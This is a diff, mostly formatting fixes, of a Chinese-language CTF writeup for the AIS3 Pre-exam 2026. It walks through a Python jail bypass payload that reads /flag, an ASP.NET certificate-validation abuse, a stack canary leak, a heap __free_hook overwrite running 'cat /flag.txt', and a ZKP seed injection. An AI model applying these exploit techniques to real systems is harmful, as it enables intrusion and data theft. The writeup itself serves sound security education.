@@ -1,11 +1,12 @@
 ---
+
 title: AIS3 Pre-exam 2026 Writeup
 published: 2026-06-12
 description: ''
 image: 'ais3.png'
 tags: [CTF]
 category: 'Writeup'
-draft: false 
+draft: false
 lang: ''
 ---
 
@@ -19,14 +20,14 @@ lang: ''
 
 ## Welcome
 
-* Tag：`Misc`
+- Tag：`Misc`
 
 1. 會連到一個網站快速變動 QR code，截一張給手機掃描看看
 2. 對著 QR code 動畫掃一掃就會拿到圖片，裡面有 Flag
 
 ## 想在雪中來杯下午茶嗎？
 
-* Tag：`Misc`
+- Tag：`Misc`
 
 1. 左側的白色牌子可以看到**上枝 3 號踏切**和電話 0748-24-1431，右邊的狗狗牌子可以發現豐鄉町
 
@@ -71,13 +72,13 @@ if __name__ == "__main__":
     app.run("0.0.0.0",port=8000)
 ```
 
-2. 發現  `shebang` does not end with a newline，因此我們輸入的 1st byte 會接在他後面。所以想到的 payload 如下：
+2. 發現 `shebang` does not end with a newline，因此我們輸入的 1st byte 會接在他後面。所以想到的 payload 如下：
 
 ```python
 #!/usr/local/bin/python3 -Xcoding:unicode-escape
 ```
 
-3. 我們想執行的 script 是  `print(open('/flag').read())`，encode 後是 `print\x28open\x28'/flag'\x29\x2eread\x28\x29\x29`。所以整個 POST Request Body 是：
+3. 我們想執行的 script 是 `print(open('/flag').read())`，encode 後是 `print\x28open\x28'/flag'\x29\x2eread\x28\x29\x29`。所以整個 POST Request Body 是：
 
 ```text
  -Xcoding:unicode-escape
@@ -138,7 +139,7 @@ if __name__ == "__main__":
     app.run("0.0.0.0",port=8000)
 ```
 
-2. 打點和 Jail 一樣，只是多限制第一行只能 24 char。我們想執行的 script 是  `print(repr(open('/flag').read()))`，進行編碼後是 `print\x28repr\x28open\x28'/flag'\x29\x2eread\x28\x29\x29\x29`。所以整個 POST Request Body 是：
+2. 打點和 Jail 一樣，只是多限制第一行只能 24 char。我們想執行的 script 是 `print(repr(open('/flag').read()))`，進行編碼後是 `print\x28repr\x28open\x28'/flag'\x29\x2eread\x28\x29\x29\x29`。所以整個 POST Request Body 是：
 
 ```text
  -Xcoding:unicode-escape
@@ -168,8 +169,8 @@ curl -sS \
 - Tags：`Web` (ASP.NET Core 8.0)
 
 1. 先請 AI 看一下架構：
-	- `/` 是 Drop 頁面，使用者輸入 collector IP 後，server 會送 HTTPS POST 到該 IP 的 `/api/flag`。由於 `IndexModel` 使用 `IPAddress.TryParse` 驗證輸入，不能直接提交 domain name 來控制 TLS SNI 或 hostname。
-	- `/Support` 是 component preview 頁面，使用者可提交 `Preview.Template` 與 `Preview.Accent`。正常情況下它會把 `status/network` 轉成內建 type，例如 `GiveMeFlag.Support.Templates.StatusNetworkCalmCard`。
+   - `/` 是 Drop 頁面，使用者輸入 collector IP 後，server 會送 HTTPS POST 到該 IP 的 `/api/flag`。由於 `IndexModel` 使用 `IPAddress.TryParse` 驗證輸入，不能直接提交 domain name 來控制 TLS SNI 或 hostname。
+   - `/Support` 是 component preview 頁面，使用者可提交 `Preview.Template` 與 `Preview.Accent`。正常情況下它會把 `status/network` 轉成內建 type，例如 `GiveMeFlag.Support.Templates.StatusNetworkCalmCard`。
 
 2. 在 `FlagDeliveryService.cs` 可以發現，從 configuration/env 讀取 flag 與 delivery 參數：
 
@@ -223,9 +224,9 @@ Type type = Type.GetType(
 ```
 
 7. 接著只檢查：
-	-  type 不是 abstract
-	- type 不是 interface
-	- type 有 public no-arg constructor
+   -  type 不是 abstract
+   - type 不是 interface
+   - type 有 public no-arg constructor
 
 8. assembly resolver 會從 app base directory 載入 DLL。因為 Dockerfile 會把整個 `publish/` 放到 `/app`，所以 `publish/` 裡所有 DLL 都是可解析目標。
 
@@ -254,10 +255,10 @@ public class ExchangeSystemUtility : StructuredRepositorySystemUtility<ExchangeP
 ```
 
 - 這個 class 符合 `PreviewComponentResolver` 的檢查：
-	- public class
-	- 繼承的 base class 提供 public no-arg constructor
-	- static constructor 在第一次建立 instance 前自動執行
-	- static constructor 修改的是 process-wide global state
+  - public class
+  - 繼承的 base class 提供 public no-arg constructor
+  - static constructor 在第一次建立 instance 前自動執行
+  - static constructor 修改的是 process-wide global state
 - 觸發後，整個 ASP.NET process 後續 HTTPS request 都會接受任意憑證
 
 10. 開始戳機器，成功時 preview 會建立 `ExchangeSystemUtility` instance，並執行 static constructor。
@@ -294,7 +295,11 @@ curl -s -b /tmp/cookies2.txt \
 12. 讀取收到的 POST body：
 
 ```json
-{"flag":"AIS3{c_5h4rp_c0n57ruc70r_p0llu710n_59ede4ed545f41fba92ed19821e7b0bc}","challenge":"GiveMeFlag","sent_at":"..."}
+{
+	"flag": "AIS3{c_5h4rp_c0n57ruc70r_p0llu710n_59ede4ed545f41fba92ed19821e7b0bc}",
+	"challenge": "GiveMeFlag",
+	"sent_at": "..."
+}
 ```
 
 ## Mass Rapid Transit
@@ -434,8 +439,8 @@ Press ENTER to start...
 ```
 
 2. 可以看到疑似加密的東西：
-	- `.rodata` at `0x17371e0`：Tetris pattern constants.
-	- `.data` at `0x1aa6130`：encrypted flag bytes.
+   - `.rodata` at `0x17371e0`：Tetris pattern constants.
+   - `.data` at `0x1aa6130`：encrypted flag bytes.
 
 ```text
 2e a5 56 46 0d 7c 8e dc 83 6f 30 83 ff f8 a5 5c
@@ -580,12 +585,12 @@ end
 ```
 
 6. 子函式大致分成幾類：
-	- byte-wise XOR helper
-	- table transform helper
-	- table interleave helper
-	- key table generator
-	- target table generator
-	- validator
+   - byte-wise XOR helper
+   - table transform helper
+   - table interleave helper
+   - key table generator
+   - target table generator
+   - validator
 7. 其中 validator 會先產生兩個 table：
 
 ```text
@@ -732,23 +737,23 @@ curl -sS -X POST http://chals1.ais3.org:50001 \
 
 ```json
 {
-  "weapon": {
-    "name": "Sword IV",
-    "damage": 34.3,
-    "maxDurability": 274,
-    "range": 3.2,
-    "angle": 65.0,
-    "cooldown": 0.55,
-    "bonusGoldPercent": 0.0,
-    "lifestealPercent": 0.0
-  },
-  "armor": {
-    "name": "AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}",
-    "slot": "Body",
-    "damageReduction": 0.2,
-    "bonusMaxHp": 15,
-    "bonusSpeed": 0
-  }
+	"weapon": {
+		"name": "Sword IV",
+		"damage": 34.3,
+		"maxDurability": 274,
+		"range": 3.2,
+		"angle": 65.0,
+		"cooldown": 0.55,
+		"bonusGoldPercent": 0.0,
+		"lifestealPercent": 0.0
+	},
+	"armor": {
+		"name": "AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}",
+		"slot": "Body",
+		"damageReduction": 0.2,
+		"bonusMaxHp": 15,
+		"bonusSpeed": 0
+	}
 }
 ```
 
@@ -908,10 +913,10 @@ r042 -> }
 
 1. 從 README.md 說明它參考 Windows 11 Alt Syscall 機制實作 syscall hook。PDB path 的 `KD_test`、device name、IOCTL flow、`EPROCESS + 0x7d0` 等細節都和 challenge binary 對得上，所以可以確定題目是在考這個機制，這樣方向就比較明確一點。
 2. 傳統 syscall hook 常會想到 SSDT，但這題用的是 Windows 11 的 Alt Syscall Provider。簡化來說：
-	1. Kernel 裡有一張 service descriptor group table。
-	2. Process 的 `EPROCESS` 中有一個 syscall provider dispatch context。
-	3. Driver 可以建立自己的 dispatch table，讓某個 process 的 syscall trap 進入自訂 callback。
-	4. Callback 回傳 `1` 代表放行原 syscall，回傳 `0` 代表不執行原 syscall。
+   1. Kernel 裡有一張 service descriptor group table。
+   2. Process 的 `EPROCESS` 中有一個 syscall provider dispatch context。
+   3. Driver 可以建立自己的 dispatch table，讓某個 process 的 syscall trap 進入自訂 callback。
+   4. Callback 回傳 `1` 代表放行原 syscall，回傳 `0` 代表不執行原 syscall。
 3. 另外，Alt Syscall 只攔截 target process 自己 thread 發出的 syscall。也就是說，driver 不是記錄全系統事件，而是記錄某個指定 PID 的 syscall sequence。
 4. 字串大法可以看到 Driver 建立 device：`\Device\KDhook`、`\DosDevices\KDhook`，以及主要 IOCTL：
 
@@ -924,11 +929,11 @@ r042 -> }
 ```
 
 5. 核心流程是：
-	1. usermode client 用 IOCTL 送 target PID。
-	2. driver 找到 target process。
-	3. driver 建立 alt syscall dispatch table。
-	4. target process 發出特定 syscall 時，wrapper 記錄 row。
-	5. 記錄滿或使用者查詢時，driver 把 row array 混成 flag。
+   1. usermode client 用 IOCTL 送 target PID。
+   2. driver 找到 target process。
+   3. driver 建立 alt syscall dispatch table。
+   4. target process 發出特定 syscall 時，wrapper 記錄 row。
+   5. 記錄滿或使用者查詢時，driver 把 row array 混成 flag。
 6. 發現 `.data` 裡有 16 個 callback wrapper address：
 
 ```text
@@ -955,8 +960,8 @@ rows:      0x140005110 ... 0x14000512c
 9. 每次 wrapper 發現 syscall number 符合自己的編號，就呼叫 `record(row_value)`。它不去重複，同一 syscall 重複發生就會重複記錄。count 到 8 後停止追加。
 
 10. 固定 row 如下，有兩個 row 和出題環境相關：
-	- `NtDelayExecution (0x34)`：讀取 `KUSER_SHARED_DATA` + 0x260 的低 16 bit，也就是 Windows build number 相關值
-	- `NtCreateFile (0x55)`：讀取 `KUSER_SHARED_DATA` + 0x2ec & 3，並混入 KdDebuggerNotPresent / KdDebuggerEnabled
+    - `NtDelayExecution (0x34)`：讀取 `KUSER_SHARED_DATA` + 0x260 的低 16 bit，也就是 Windows build number 相關值
+    - `NtCreateFile (0x55)`：讀取 `KUSER_SHARED_DATA` + 0x2ec & 3，並混入 KdDebuggerNotPresent / KdDebuggerEnabled
 
 ```text
 06 -> 0x7581ea5d
@@ -996,16 +1001,16 @@ out[35]     = 0
 12. 一開始用舊版 syscall table 查 `0xb2` / `0xbe`，會得到舊 Windows 版本的名稱，例如 `NtCreateMailslotFile` 或 `NtCreateSectionEx`。在新版 Win11 上分別對應到 `NtCreateMutant` 和 `NtCreateSemaphore`。這個差異不影響 row value，因為 binary 比對的是 syscall number；但會影響我們根據 Win32 API 行為猜 sequence 的方向。
 
 13. 還原完 row 和 flag function 後，剩下的未知數是：
-	- 8 個 syscall number 的順序
-	- Windows build number
-	- `KUSER_SHARED_DATA + 0x2ec & 3`
-	- `KdDebuggerNotPresent` / `KdDebuggerEnabled` 的值
+    - 8 個 syscall number 的順序
+    - Windows build number
+    - `KUSER_SHARED_DATA + 0x2ec & 3`
+    - `KdDebuggerNotPresent` / `KdDebuggerEnabled` 的值
 
 14. 所以寫一支程式：
-	1. 根據 build / debugger state 產生 `0x34` 和 `0x55` 的 row
-	2. 枚舉 8 個 syscall sequence，允許重複
-	3. 計算 seed、SHA-256 和輸出
-	4. 用 `AIS3{` 前綴過濾 candidate
+    1. 根據 build / debugger state 產生 `0x34` 和 `0x55` 的 row
+    2. 枚舉 8 個 syscall sequence，允許重複
+    3. 計算 seed、SHA-256 和輸出
+    4. 用 `AIS3{` 前綴過濾 candidate
 
 ```cpp
 #include <array>
@@ -1263,8 +1268,8 @@ build=26200 low2=0 kd_not_present=0 kd_enabled=1 seq=48,34,b2,0e,be,20,55,1e fla
 
 - Tags：`Reverse`
 - 題目提供兩個檔案：
-	- `dg-server`: stripped, statically linked x86-64 ELF.
-	- `scripts/dg-verify.py`: verifier script provided by the challenge.
+  - `dg-server`: stripped, statically linked x86-64 ELF.
+  - `scripts/dg-verify.py`: verifier script provided by the challenge.
 - 給定指令`python3 dg-verify.py @chals1.ais3.org:53573 www.curious.sleeping A`，表示讓 chals DNS 查詢 sleeping 的 A record
 
 1. verifier 會發 DoH-like 請求到 `/dns-query?name=<name>&type=<type>`，並且會驗證一條 DNSSEC-like 的 Ed25519 信任鏈：
@@ -1599,7 +1604,6 @@ printf '%s\n' status azft0azxct7utcyw \
 # azft0azxct7utcyw
 ```
 
-
 12. 因為 `zone_buf[0:20]` 幾乎全是 `ff`，`h1 | zone_buf[0:20]` 大部分 byte 都會被固定成 `ff`。把未知 hash 反推 `final_mix`，第一個 byte `0x10` 是 label 長度 16，後面可以看出 hidden owner 是：`azft0azxct7utcyw.curious.sleeping.`
 
 ```text
@@ -1628,7 +1632,7 @@ azft0azxct7utcyw.curious.sleeping. RRSIG TXT 15 3 3600 20300101000000 2026051300
 
 ![Source](../../assets/images/AIS3_2026/print1.png)
 
-4. 從可以發現，這裡 stack buffer 是 `0x50` bytes，但 `read(0, buf, 0xe0)` 讀入 `224` bytes，限制是 `payload[0]` 必須是 'Y' 或 'y'，buffer size = 0x50、saved rbp   = 8、return addr = 0x58。
+4. 從可以發現，這裡 stack buffer 是 `0x50` bytes，但 `read(0, buf, 0xe0)` 讀入 `224` bytes，限制是 `payload[0]` 必須是 'Y' 或 'y'，buffer size = 0x50、saved rbp = 8、return addr = 0x58。
 
 ![Source](../../assets/images/AIS3_2026/print2.png)
 
@@ -1755,9 +1759,9 @@ AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}
 
 - Tags：`Pwn`
 - `dg-server` 是一個自訂 DNS-over-HTTP (DoH) 伺服器，實作了類似 DNSSEC 的簽名驗證系統。
-	- HTTP GET `/dns-query?name=<name>&type=<type>`
-	- 支援 DNS 記錄類型：A, NS, MX, SOA, DNSKEY, DS, RRSIG, NSEC6
-	- 使用 Ed25519 簽名驗證
+  - HTTP GET `/dns-query?name=<name>&type=<type>`
+  - 支援 DNS 記錄類型：A, NS, MX, SOA, DNSKEY, DS, RRSIG, NSEC6
+  - 使用 Ed25519 簽名驗證
 
 1. 首先檢查防護機制有開 `Partial RELRO`、`NX`、`IBT`、`canary`
 2. 打開 IDA 發現 `format_invalid_type` (sub_40923F)，當 HTTP `type` 參數不是合法 DNS 類型時，伺服器呼叫此函數。其 stack layout 如下：
@@ -1785,26 +1789,32 @@ rbp + 0x08  return address   (= 0x4095e4)
 4. 當 type 長度 ≥ 18 時，溢出會把 `type_len_16`（rbp-0x30）改成 `0x4141`（> 160），讓 `hex_encode` 固定讀取 160 bytes，包含 type_buf 後方的堆疊資料。
 
 送出 56 個 'X'：
+
 ```
 GET /dns-query?name=www.curious.sleeping.&type=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1
 ```
 
 response 範例：
+
 ```json
-{"Status":4,"Comment":"invalid query type","bad_type":"5858...5800<canary><outer_rbp><ret_addr>..."}
+{
+	"Status": 4,
+	"Comment": "invalid query type",
+	"bad_type": "5858...5800<canary><outer_rbp><ret_addr>..."
+}
 ```
 
 160-byte 洩漏的 offset 對照：
 
-| Offset | Content                      |
-| ------ | ---------------------------- |
-| 0–55   | type_buf (56 'X')            |
-| 56–63  | **canary** (8 bytes)         |
-| 64–71  | **outer_rbp** (外層函數 rbp 值)   |
-| 72–79  | return address (= 0x4095e4)  |
-| 80–87  | 外層函數 arg2                    |
-| 88–91  | 未初始化                         |
-| 92–95  | **socket_fd** (4-byte DWORD) |
+| Offset | Content                         |
+| ------ | ------------------------------- |
+| 0–55   | type_buf (56 'X')               |
+| 56–63  | **canary** (8 bytes)            |
+| 64–71  | **outer_rbp** (外層函數 rbp 值) |
+| 72–79  | return address (= 0x4095e4)     |
+| 80–87  | 外層函數 arg2                   |
+| 88–91  | 未初始化                        |
+| 92–95  | **socket_fd** (4-byte DWORD)    |
 
 > socket_fd 推導：外層函數 (0x409440) 將 `edi`（socket fd）存於 `[rbp-0x6254]`。
 > 由 format_invalid_type frame 結構推算：
@@ -1815,14 +1825,15 @@ response 範例：
 ![Source](../../assets/images/AIS3_2026/dg2.png)
 
 **URL Decode 行為**：
+
 - `type` 參數值為原始 URL-encoded 字串，`struct+0x108` 存的是 decoded byte 數
 - `%XX` → 單一 byte，因此可傳入任意二進位資料
 - 前 16 bytes（decoded 位置 0~15） 會套用 `tolower/toupper`，因此需避開
 
 6. 送出 56 個 'X' 作為 type 參數，解析 response 取得：
-	- `canary`：用於通過 canary 檢查
-	- `outer_rbp`：計算 `/flag.txt` 字串在堆疊上的地址
-	- `socket_fd`：write syscall 目標 fd（實測為 4）
+   - `canary`：用於通過 canary 檢查
+   - `outer_rbp`：計算 `/flag.txt` 字串在堆疊上的地址
+   - `socket_fd`：write syscall 目標 fd（實測為 4）
 
 7. 送出 exploit 後拿到 Flag（節錄）：
 
@@ -2059,7 +2070,7 @@ req = http_req(body, host=b"A" * 511)
 ![Source](../../assets/images/AIS3_2026/ooonvifd3.png)
 
 6. 問題出在 parser 遇到 `\r\n--...` 時會進入 boundary detection。若 boundary match 到一半失敗，它會把剛剛讀到的 bytes 補回 content buffer。這段補回邏輯只檢查目前是否還有空間，沒有檢查「整段要補回的 bytes」是否都放得下。
-![Source](../../assets/images/AIS3_2026/ooonvifd4.png)
+   ![Source](../../assets/images/AIS3_2026/ooonvifd4.png)
 
 7. 利用方式是讓 content 長度剛好接近 `0x200`，例如 `0x1ff`，然後送一段假的 boundary prefix，這樣 parser 補回 fake boundary bytes 時會越過目前 `0x210` chunk，進而覆蓋下一個 heap chunk 的內容：
 
@@ -2076,15 +2087,15 @@ __free_hook:  0x1eee48
 ```
 
 10. 整理利用流程如下：
-	1. 用 `GetCapabilities` 長 Host leak libc base
-	2. 先送一個合法 multipart request，建立三個 `0x210` content chunk，讓它們進入 tcache
-	3. 再送 exploit multipart request
-	4. 第一個 part 用 `0x1ff` bytes content 觸發 fake boundary overflow
-	5. overflow 覆蓋下一個 freed `0x210` chunk 的 tcache `fd`
-	6. 後續 `malloc(0x200)` 被導到 `__free_hook - delta`
-	7. writer part 在 `__free_hook` 寫入 `system`
-	8. cleanup 時程式會 `free()` attachment content，變成呼叫 `system(content)`
-	9. 最後 command part 內容放 `cat /flag.txt 1>&4`
+    1. 用 `GetCapabilities` 長 Host leak libc base
+    2. 先送一個合法 multipart request，建立三個 `0x210` content chunk，讓它們進入 tcache
+    3. 再送 exploit multipart request
+    4. 第一個 part 用 `0x1ff` bytes content 觸發 fake boundary overflow
+    5. overflow 覆蓋下一個 freed `0x210` chunk 的 tcache `fd`
+    6. 後續 `malloc(0x200)` 被導到 `__free_hook - delta`
+    7. writer part 在 `__free_hook` 寫入 `system`
+    8. cleanup 時程式會 `free()` attachment content，變成呼叫 `system(content)`
+    9. 最後 command part 內容放 `cat /flag.txt 1>&4`
 
 11. 送出 exploit payload 到遠端（節錄）：
 
@@ -2193,11 +2204,11 @@ if __name__ == "__main__":
 - `verifier/chal.py`：我們連到的互動服務，會替我們去問 prover
 
 1. 先玩玩看互動服務，有兩個選項。在`challenge` 要連續通過 16 輪，每一輪 verifier 會：
-	1. 產生 32 bytes 的 `server_part`
-	2. 要我們輸入 `shown_nonce`
-	3. 計算 `suffix = shown_nonce || server_part`
-	4. 隨機選一個 `seed`
-	5. 要我們回答 `compute_proof(flag, suffix, seed)`
+   1. 產生 32 bytes 的 `server_part`
+   2. 要我們輸入 `shown_nonce`
+   3. 計算 `suffix = shown_nonce || server_part`
+   4. 隨機選一個 `seed`
+   5. 要我們回答 `compute_proof(flag, suffix, seed)`
 
 2. 核心 proof 在 `zkp.py`，也就是對 `sha256(flag || suffix)` 的 256 個 bit 從高位到低位掃過去：
 
@@ -2244,11 +2255,11 @@ def compute_proof(flag, suffix, seed, bit_flip_indices=None):
 ```
 
 5. 所以我們拿到一個 oracle：
-	- suffix 固定為 `user_part || server_part`。
-	- digest 是固定的 `sha256(flag || suffix)`。
-	- 我們可以選 seed。
-	- 我們可以逐步翻 digest 的 bit。
-	- 每次可以取得翻轉後 digest 的 proof。
+   - suffix 固定為 `user_part || server_part`。
+   - digest 是固定的 `sha256(flag || suffix)`。
+   - 我們可以選 seed。
+   - 我們可以逐步翻 digest 的 bit。
+   - 每次可以取得翻轉後 digest 的 proof。
 
 6. 公開的 modulus $N$ 可以分解成小質數 $p \times q$ 相乘：
 
@@ -2269,7 +2280,7 @@ proof = 1 + t * lambda mod N
 
 所以看到 proof 後，可以查表反推出 `t`，也就是目前 digest 最右邊的「可見 `1`」在哪裡。
 
-8. 有一個邊界情況：如果 digest 一開始是連續的前綴 `1`，在遇到第一個 `0` 之前 `value` 都還是 0，所以那些前綴 `1` 不會被  $x^\lambda = 1$  這個性質看見。當所有可見的 `1` 都被我們翻成 0 後，digest 會長這樣 `111...1110 000...000`，此時 proof 會是：
+8. 有一個邊界情況：如果 digest 一開始是連續的前綴 `1`，在遇到第一個 `0` 之前 `value` 都還是 0，所以那些前綴 `1` 不會被 $x^\lambda = 1$ 這個性質看見。當所有可見的 `1` 都被我們翻成 0 後，digest 會長這樣 `111...1110 000...000`，此時 proof 會是：
 
 ```text
 proof = zero_count * lambda mod N
@@ -2282,13 +2293,13 @@ leading_ones = 256 - zero_count
 ```
 
 9. 整理流程如下：
-	1. 進 `ask prover`
-	2. nonce 輸入 `base64(user_part) + "&s=" + str(lambda)`，注入 seed
-	3. 查 proof
-	4. 如果 proof 是 `1 + t * lambda` 形式，表示目前最後一個可見 `1` 的位置是 `255 - t`
-	5. 用 flip oracle 把該 bit 翻成 0
-	6. 重複直到 proof 變成 `zero_count * lambda` 形式
-	7. 用 `zero_count` 補回前綴的連續 `1`，得到完整 256-bit digest
+   1. 進 `ask prover`
+   2. nonce 輸入 `base64(user_part) + "&s=" + str(lambda)`，注入 seed
+   3. 查 proof
+   4. 如果 proof 是 `1 + t * lambda` 形式，表示目前最後一個可見 `1` 的位置是 `255 - t`
+   5. 用 flip oracle 把該 bit 翻成 0
+   6. 重複直到 proof 變成 `zero_count * lambda` 形式
+   7. 用 `zero_count` 補回前綴的連續 `1`，得到完整 256-bit digest
 
 10. 所以用兩張表做 proof decode：
 
@@ -2366,11 +2377,11 @@ def sha256_continue(digest, processed_len, data):
 ```
 
 13. flag 長度未知，所以先用 oracle 測。對每個候選長度 `flag_len`：
-	1. 算出 `glue = sha256_padding(flag_len + len(base_suffix))`
-	2. 用 oracle 請 prover 計算 `base_suffix || glue || fresh_server_part` 的 proof
-	3. 自己用 length extension 計算預測 digest
-	4. 用公開的 `compute_proof_from_digest(predicted, 2)` 計算預測 proof
-	5. 如果 proof 相同，長度就是對的
+    1. 算出 `glue = sha256_padding(flag_len + len(base_suffix))`
+    2. 用 oracle 請 prover 計算 `base_suffix || glue || fresh_server_part` 的 proof
+    3. 自己用 length extension 計算預測 digest
+    4. 用公開的 `compute_proof_from_digest(predicted, 2)` 計算預測 proof
+    5. 如果 proof 相同，長度就是對的
 
 ```python
 def find_flag_len(base_suffix, base_digest):
@@ -2395,9 +2406,9 @@ shown = base64(base_suffix || sha256_padding(flag_len + len(base_suffix)))
 ```
 
 15. verifier 印出該輪的 `server suffix` 和 `seed` 後：
-	1. 對 `server suffix` 做 SHA-256 length extension
-	2. 用公開的 `compute_proof_from_digest()` 計算 proof
-	3. 送回 verifier
+    1. 對 `server suffix` 做 SHA-256 length extension
+    2. 用公開的 `compute_proof_from_digest()` 計算 proof
+    3. 送回 verifier
 
 ```python
 def solve_challenge(base_suffix, base_digest, flag_len):
